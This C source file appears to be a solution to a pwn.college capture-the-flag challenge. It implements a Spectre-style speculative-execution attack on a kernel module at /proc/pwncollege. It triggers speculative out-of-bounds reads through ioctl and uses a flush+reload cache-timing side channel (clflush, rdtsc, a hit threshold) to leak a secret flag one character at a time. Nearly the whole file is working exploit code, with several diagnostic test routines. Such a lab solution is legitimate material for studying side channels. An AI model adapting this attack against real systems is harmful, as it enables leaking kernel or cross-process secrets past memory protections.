#define _GNU_SOURCE

#include <time.h> 
#include <fcntl.h> 
#include <sys/types.h>
#include <unistd.h> 
#include <sys/mman.h> 
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdbool.h>
#include <sched.h>
#include <sys/ioctl.h>

#define CACHE_HIT_THRESHOLD 120
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 256

int fd;
volatile char *shared_buffer;



void serialize_completely() {
    unsigned int eax, ebx, ecx, edx;
    __asm__ volatile ("cpuid"
                     : "=a" (eax), "=b" (ebx), "=c" (ecx), "=d" (edx)
                     : "a" (0)
                     : "memory");
}

void pre_work() {
    serialize_completely();
    
    for (int j = 0; j < 256; j++) {
        uint8_t *addr = (uint8_t*)(shared_buffer + j * CACHE_LINE_SIZE);
        _mm_clflush(addr);
        _mm_clflush(addr);  // Double flush
    }
    
    _mm_mfence();
    _mm_lfence();
    serialize_completely();
}

uint64_t time_access_no_flush(void *p) {
    uint64_t start, end;
    _mm_mfence();
    start = __rdtsc();
    volatile uint8_t x = *(volatile uint8_t*)p;
    _mm_mfence();
    end = __rdtsc();
    return end - start;
}

bool post_work_inner_work(int mix_i) {
    uint8_t *addr;
    size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
    
    int offset = mix_i * CACHE_LINE_SIZE;
    addr = (uint8_t*)(shared_buffer + offset);
    uint64_t t_no_flush = time_access_no_flush(addr);
    
    if (mix_i >= 32 && mix_i <= 126 && t_no_flush <= cache_hit_threshold) {
        printf("cache hit! %d ('%c') timing: %ld\n", mix_i, mix_i, t_no_flush);
        return true;
    }
    return false;
}

void post_work(int *stats) {
    // Test all printable ASCII characters in mangled order
    for (size_t i = 0; i < 95; i++) {
        int ascii = 32 + ((i * 73) + 13) % 95;  // Mangle order, not memory access
        if (post_work_inner_work(ascii)) {
            stats[ascii]++;
        }
    }
}

bool unsolved(int *results, int len) {
    for (int i = 0; i < len; i++) {
        if (results[i] == 0) {
            return true;
        }
    }
    return false;
}

void *attach_to_kernel_mem() {
    fd = open("/proc/pwncollege", O_RDWR);

    
    char *ptr = mmap(NULL, 256 * 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);

    
    // Initialize memory
    for (int i = 0; i < 256 * 0x1000; i++) {
        ptr[i] = 1;
    }
    
    return ptr;
}

void train_target() {
    // Train with valid indexes (0-5) to make branch predictor expect valid access
    for (int i = 0; i < 1000; i++) {
        int train_val = i % 6;  // Valid training values 0-5
        *(volatile uint32_t*)shared_buffer = train_val;
        ioctl(fd, 0, 0);
    }
}

void speculate(int pos) {
    // Trigger speculation with invalid index (6 + pos)
    // This should access flag[6 + pos] and cache it at shared_buffer[flag_char * 0x1000]
    for (int i = 0; i < 300; i++) {
        *(volatile uint32_t*)shared_buffer = pos;
        ioctl(fd, 0, 0);
    }
}


void exploit(int len) {
    int *results = calloc(len + 1, sizeof(int));
    int max_index = 0;
    int max_val = 0;
    int stats[256] = {0};
    
    while(unsolved(results, len)) {
        for (int i = 0; i < len; i++) {
            if (results[i] != 0)
                continue;
            
            // Clear stats
            memset(stats, 0, sizeof(stats));
            
            if (!unsolved(results, len)) {
                break;
            }
            
            // Work loop
            for (int j = 0; j < 1000; j++) {
                pre_work();
                //train_target();
                	
                // No delays for kernel speculation!
                speculate(i);
                
                post_work(stats);
            }
            
            // Find best candidate
            max_val = 0;
            max_index = 0;
            for (int j = 32; j <= 126; j++) {  // Printable ASCII only
                if (stats[j] > max_val) {
                    max_index = j;
                    max_val = stats[j];
                }
            }
            
            if (max_index != 0 && max_val > 2) {  // Need more confidence
                results[i] = max_index;
                printf("Position %d: found '%c' (%d) with %d hits\n", 
                       i, max_index, max_index, max_val);
            }
            
            printf("Current results: ");
            for (int j = 0; j < len; j++) {
                printf("%c", results[j] ? results[j] : '?');
            }
            printf("\n");
        }
    }
    
    free(results);
}









void test_speculation() {
    printf("Testing if speculation works...\n");
    
    // Clear everything
    pre_work();
    
    // Don't train, just speculate for position 0
    *(volatile uint32_t*)shared_buffer = 0;  // Should access flag[6]
    ioctl(fd, 0, 0);
    
    // Check ALL pages for cache hits
    int hit_count = 0;
    for (int i = 32; i <= 126; i++) {
        uint8_t *addr = (uint8_t*)(shared_buffer + i * 0x1000);
        uint64_t time = time_access_no_flush(addr);
        if (time <= CACHE_HIT_THRESHOLD) {
            printf("Speculation test: char %d ('%c') cached with time %lu\n", i, i, time);
            hit_count++;
        }
    }
    
    printf("Total speculation hits: %d\n", hit_count);
    if (hit_count == 0) {
        printf("ERROR: Speculation not working!\n");
    } else if (hit_count > 5) {
        printf("ERROR: Too many hits - prefetching or other issues!\n");
    }
}



void minimal_test() {
    printf("Minimal test without training...\n");
    
    for (int pos = 0; pos < 3; pos++) {
        pre_work();  // Flush
        
        // Direct speculation without training
        *(volatile uint32_t*)shared_buffer = 6 + pos;
        ioctl(fd, 0, 0);
        
        // Check for hits
        for (int ascii = 32; ascii <= 126; ascii++) {
            uint8_t *addr = (uint8_t*)(shared_buffer + ascii * 0x1000);
            uint64_t time = time_access_no_flush(addr);
            if (time <= CACHE_HIT_THRESHOLD) {
                printf("Pos %d: char %d ('%c') time %lu\n", pos, ascii, ascii, time);
            }
        }
    }
}





void test_cache_behavior() {
    printf("Testing cache behavior...\n");
    
    // Test specific character
    uint8_t *test_addr = (uint8_t*)(shared_buffer + 'A' * 0x1000);
    
    // Ensure it's cached
    volatile uint8_t dummy = *test_addr;
    uint64_t cached_time = time_access_no_flush(test_addr);
    
    // Flush and test
    _mm_clflush(test_addr);
    _mm_mfence();
    uint64_t flushed_time = time_access_no_flush(test_addr);
    
    printf("Cached: %lu, Flushed: %lu cycles\n", cached_time, flushed_time);
    
    if (abs(cached_time - flushed_time) < 50) {
        printf("WARNING: Cache timing not working properly!\n");
    }
}





void set_affinity() {
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(0, &set);  // Use core 0 for kernel interaction
    sched_setaffinity(0, sizeof(set), &set);
}

int main(int argc, char** argv) {
    printf("Starting kernel module Spectre attack...\n");
    
    set_affinity();
    shared_buffer = (volatile char*)attach_to_kernel_mem();
    
    printf("Memory mapped at: %p\n", shared_buffer);
    
 //   simple_exploit(5);
   // test_speculation();
    //minimal_test();
    //test_cache_behavior();
    exploit(68);  // Adjust length as needed
    
    // Cleanup
    munmap((void*)shared_buffer, 256 * 0x1000);
    close(fd);
    return 0;
}
